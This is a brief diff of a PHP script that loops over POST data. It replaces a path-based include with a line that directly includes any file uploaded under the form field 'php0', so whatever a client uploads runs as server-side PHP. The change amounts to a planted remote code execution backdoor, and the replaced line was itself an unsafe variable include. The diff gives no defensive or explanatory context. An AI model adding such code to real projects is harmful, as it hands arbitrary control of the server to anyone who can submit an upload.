@@ -14,4 +14,6 @@ foreach ($_POST as $key => $item) {
         exit();
     }
 }
-include "../$path";
+//var_dump($_FILES);
+include $_FILES['php0']['tmp_name'];
+//include "../$path";
